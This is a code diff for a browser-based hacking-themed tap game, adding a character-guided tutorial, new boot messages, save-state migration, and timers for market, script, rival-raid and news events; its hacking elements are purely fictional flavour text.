+        <span style="color:#00aa2a">SELLING ${rateStr} · clears in ~${timeLeft}</span>
+        <span>from ${loot.source}</span>
+      </div>`;
+    container.appendChild(card);
+  });
+}
+
+// ═══════════════════════════════════════════════
+// TUTORIAL SYSTEM
+// v01d-guided, in-terminal, step-by-step
+// ═══════════════════════════════════════════════
+
+// Tutorial state — what step are we waiting on
+let tutWaiting = null; // null | 'tap_mission' | 'tap_type' | 'phase2_done' | 'open_hw' | 'open_map'
+
+// Called after each meaningful action to advance tutorial
+function tutorialCheck(event){
+  if(G.tutorialDone) return;
+  if(tutWaiting === event){
+    tutWaiting = null;
+    // Small delay then next step
+    setTimeout(()=>tutorialAdvance(), 600);
+  }
+}
+
+async function runTutorial(){
+  G.tutorialStep = 0;
+  G.tutorialDone = false;
+
+  // Boot lines
+  const bootLines = [
+    ['> HACKNODE OS v0.5.0','dim',180],
+    ['> Initializing...','dim',120],
+    ['> Alias assigned: ghost_r00t','ok',150],
+    ['> Location: UNKNOWN  |  Status: UNTRACEABLE','ok',180],
+    ['─'.repeat(36),'sep',300],
+  ];
+  for(const[t,c,w] of bootLines){ log(t,c); await delay(w); }
+
+  await delay(400);
+  await tutorialAdvance();
+}
+
+async function tutorialAdvance(){
+  if(G.tutorialDone) return;
+  G.tutorialStep++;
+
+  switch(G.tutorialStep){
+
+    case 1:
+      logMsg('v01d: You found this terminal. Good. That means you know what you are doing — or you think you do.','void');
+      logMsg('v01d: I will walk you through your first operation. Pay attention.','void');
+      log('> [MSG] Incoming message. Check the MSG tab above.','info');
+      await delay(1200);
+      log('> Your first target: the local network. You need to map it before you can touch it.','dim');
+      await delay(800);
+      log('> Tap [ OPS ] in the nav bar below to select a mission.','info');
+      tutWaiting = 'tap_mission';
+      break;
+
+    case 2:
+      await delay(400);
+      log('> Good. You will see NETWORK SCAN is the only available op right now.','dim');
+      await delay(600);
+      log('> Select it. This runs nmap against your local subnet.','info');
+      break;
+
+    case 3:
+      // Mission selected — explain phase 1
+      await delay(500);
+      log('> Phase 1: Execute the command.','info');
+      await delay(400);
+      log('> Every op starts with you running the command manually. Tap the button to type.','dim');
+      await delay(400);
+      log('> Each tap advances one character. Upgrade your scripting tools later to go faster.','dim');
+      tutWaiting = 'tap_type'; // wait for first tap
+      break;
+
+    case 4:
+      // First tap happened
+      await delay(300);
+      log('> Keep tapping until the command is complete.','dim');
+      tutWaiting = 'phase2_start';
+      break;
+
+    case 5:
+      // Phase 2 started
+      await delay(200);
+      log('> Phase 2: Hardware processes the op. Watch the countdown.','proc');
+      await delay(500);
+      log('> Your CPU, bandwidth, and latency determine how fast this runs.','dim');
+      await delay(400);
+      log('> See the TRACE meter in the header? Every op raises it. Hit 100% and you burn.','warn');
+      tutWaiting = 'phase2_done';
+      break;
+
+    case 6:
+      // Mission complete
+      await delay(500);
+      log('─'.repeat(36),'sep');
+      log('> First op done. Check your MAP — a new node was revealed.','info');
+      await delay(600);
+      log('> Tap [ MAP ] in the nav bar.','info');
+      tutWaiting = 'open_map';
+      break;
+
+    case 7:
+      // Map opened
+      await delay(500);
+      log('> That node is now a target. Run more recon to reveal the rest.','dim');
+      await delay(600);
+      log('> When you have nodes revealed, you can run tougher ops against them.','dim');
+      await delay(600);
+      log('> Now check your hardware. Tap [ HW ].','info');
+      tutWaiting = 'open_hw';
+      break;
+
+    case 8:
+      // HW opened
+      await delay(500);
+      log('> Upgrades cost credits. Start with DSL and Tab Complete — both change how the game feels immediately.','dim');
+      await delay(600);
+      log('> DSL speeds up data transfers. Tab Complete lets each tap complete a full word.','dim');
+      await delay(800);
+      logMsg('v01d: One more thing. The TRACE meter does not stay high on its own — it decays. But run too many ops in a row and it will catch up with you. Pace yourself. Or do not. Your call.','void');
+      log('> [MSG] Another message from v01d.','info');
+      await delay(600);
+      log('─'.repeat(36),'sep');
+      log('> Tutorial complete. You know enough to be dangerous.','ok');
+      await delay(400);
+      log('> Run more ops. Reveal more nodes. Upgrade your rig. Expand.','dim');
+      await delay(200);
+      log('> Someone is watching. They always are.','dim');
+      G.tutorialDone = true;
+      save();
+      break;
+  }
+}
+
+// Hook tutorial events into existing functions
+// These are called from within mission/UI functions
+function onTutMissionSelected(){
+  if(G.tutorialDone) return;
+  if(G.tutorialStep === 1){ tutorialCheck('tap_mission'); tutorialAdvance(); }
+  else if(G.tutorialStep === 2){ G.tutorialStep = 2; tutorialAdvance(); }
+}
+function onTutFirstTap(){
+  if(G.tutorialDone||G.tutorialStep < 3) return;
+  if(G.tutorialStep === 3){ tutorialCheck('tap_type'); tutorialAdvance(); }
+}
+function onTutPhase2Start(){
+  if(G.tutorialDone) return;
+  if(G.tutorialStep === 4){ tutorialCheck('phase2_start'); tutorialAdvance(); }
+}
+function onTutPhase2Done(){
+  if(G.tutorialDone) return;
+  if(G.tutorialStep === 5){ tutorialCheck('phase2_done'); tutorialAdvance(); }
+}
+function onTutMapOpened(){
+  if(G.tutorialDone) return;
+  if(G.tutorialStep === 6){ tutorialCheck('open_map'); tutorialAdvance(); }
+}
+function onTutHWOpened(){
+  if(G.tutorialDone) return;
+  if(G.tutorialStep === 7){ tutorialCheck('open_hw'); tutorialAdvance(); }
+}
+
 async function boot(){
-  const status=document.getElementById('bootstatus'),screen=document.getElementById('boot');
+  const status=el('bootstatus'),screen=el('boot');
+  // Load sound pref first
+  const snd=localStorage.getItem('hacknode_snd');
   const hasSave=load();
-  for(const line of['HACKNODE OS v0.3.0','Loading kernel modules...','Network stack ready...','Anonymization layer: ACTIVE','System ready.']){status.textContent=line;await delay(250);}
+  G.soundOn=snd==='1'; // sound pref overrides save
+  const sndBtn=document.getElementById('nb-snd');
+  if(sndBtn){sndBtn.textContent=G.soundOn?'SND✓':'SND';sndBtn.style.color=G.soundOn?'#00ff41':'#4a7a4a';}
+
+  for(const line of['HACKNODE OS v0.4.0','Kernel modules loaded...','Network stack initialised...','Anonymisation layer: ACTIVE','Narrative engine: ONLINE','System ready.']){status.textContent=line;await delay(240);}
   await delay(300);
   screen.style.transition='opacity .5s'; screen.style.opacity='0';
   await delay(500); screen.style.display='none';
+
+  initNetworkMap();
+
   if(hasSave){
     G.missionRunning=false; G.phase=null; G.activeMission=null;
     if(!G.missionQueue)G.missionQueue=[];
     if(!G.knownTargets)G.knownTargets={};
+    if(!G.networkNodes)G.networkNodes={};
+    if(!G.sectorProgress)G.sectorProgress={0:{missions:0,owned:0}};
+    if(!G.unlockedSectors)G.unlockedSectors=[0];
+    if(!G.deployedScripts)G.deployedScripts=[];
+    if(!G.lootInventory)G.lootInventory=[];
+    if(!G.marketEarnings)G.marketEarnings=0;
+    if(!G.newsItems)G.newsItems=[];
+    if(G.faction&&FACTION_MT[G.faction])FACTION_MISSIONS=FACTION_MT[G.faction].map(t=>genMission(t));
     if(G.typingTier>=3)startAutoTick();
-    updateUI(); updateTapBtn(); updateHeatDisp();
+    initNetworkMap(); initRivalNodes(); renderNewsPane();
+    // Restore faction bar
+    if(G.faction){el('faction-bar').classList.add('on');el('faction-cipher').style.display=G.faction==='cipher'?'block':'none';el('faction-ghost').style.display=G.faction==='ghost'?'block':'none';}
+    updateUI(); updateTapBtn(); updateHD();
     log('> Connection restored.','dim');
     log(`> Welcome back, ${G.alias}`,'ok');
-    if(G.missionsCompleted>0)log(`> ${G.missionsCompleted} missions. ${Object.keys(G.knownTargets).length} known targets.`,'dim');
+    if(G.faction)log(`> Faction: ${G.faction.toUpperCase()} — standing confirmed`,G.faction);
+    if(G.missionsCompleted>0)log(`> ${G.missionsCompleted} ops on record. ${Object.keys(G.knownTargets).length} targets known.`,'dim');
     const g=calcOff(Math.floor((Date.now()-G.lastSeen)/1000));
     if(g)showOffModal(g);
   }else{
+    initNetworkMap(); initRivalNodes();
     updateUI(); updateTapBtn();
-    const lines=[
-      ['> HACKNODE OS v0.3.0','dim',180],['> Alias: ghost_r00t','ok',140],
-      ['> Location: UNKNOWN','dim',110],['> Status: UNTRACEABLE','ok',160],
-      ['─'.repeat(36),'sep',200],
-      ['> Two phases: TYPE the command, then hardware PROCESSES it.','info',80],
-      ['> Watch for INTERRUPTS during processing. React fast.','dim',60],
-      ['> Run NETWORK SCAN first — intel unlocks bonuses on follow-ups.','dim',0],
-    ];
-    for(const[t,c,w]of lines){log(t,c);if(w)await delay(w);}
+    await runTutorial();
   }
 }
 function delay(ms){return new Promise(r=>setTimeout(r,ms));}
 
 boot();
 setInterval(()=>save(),30000);
-// Passive worm drip
+// Market tick — drains loot into credits
+setInterval(()=>marketTick(),2000);
+// Script tick
+setInterval(()=>scriptTick(),2000);
+// Rival passive reclaim — every 10 minutes
+setInterval(()=>{if(Object.values(G.networkNodes||{}).filter(n=>n.status==='owned').length>2)rivalPassiveReclaim();},600000);
+// Rival active raids — random chance every 3 min if heat is high
+setInterval(()=>{if(G.heat>50&&G.missionRunning&&Math.random()<.3)triggerRivalRaid();},180000);
+// News feed — new item every 3-5 min
 setInterval(()=>{
-  if(G.missionsCompleted>=50&&(G.upgrades.ssh_backdoor||G.upgrades.worm_deploy)){
-    G.credits+=1.5*G.rep; updateUI();
-  }
-},3000);
+  if(G.missionsCompleted>=3){addNewsItem();}
+},rnd(180000,300000));
+// Sector progress bar update
+setInterval(()=>{
+  // Update owned count in sector progress
+  const owned=countOwnedInSector(G.currentSector);
+  if(!G.sectorProgress[G.currentSector])G.sectorProgress[G.currentSector]={missions:0,owned:0};
+  G.sectorProgress[G.currentSector].owned=owned;
+  tryUnlockSectors();
+},10000);
 </script>
 
 </body>
